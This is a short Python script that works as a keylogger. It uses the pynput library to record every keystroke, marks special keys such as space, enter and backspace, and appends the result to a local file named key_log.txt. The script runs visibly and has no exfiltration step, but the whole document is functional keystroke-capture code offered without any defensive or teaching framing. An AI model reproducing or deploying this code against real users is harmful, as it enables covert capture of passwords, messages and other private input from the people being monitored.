from pynput.keyboard import Listener, Key

# Path to log file
log_file = "key_log.txt"

# Function to log key presses
def log_key(key):
    try:
        # Open the log file to append
        with open(log_file, "a") as f:
            if isinstance(key, Key):
                # Handle special keys (space, enter, etc.)
                if key == Key.space:
                    f.write(" [SPACE] ")
                elif key == Key.enter:
                    f.write(" [ENTER] \n")
                elif key == Key.tab:
                    f.write(" [TAB] ")
                elif key == Key.backspace:
                    f.write(" [BACKSPACE] ")
                else:
                    f.write(f" [{key}] ")
            else:
                # Handle alphanumeric keys
                f.write(f"{key.char}")
    except Exception as e:
        print(f"Error logging key: {e}")

# Function to start the keylogger
def start_keylogger():
    print("Starting keylogger... (Press Ctrl + C to stop)")
    with Listener(on_press=log_key) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
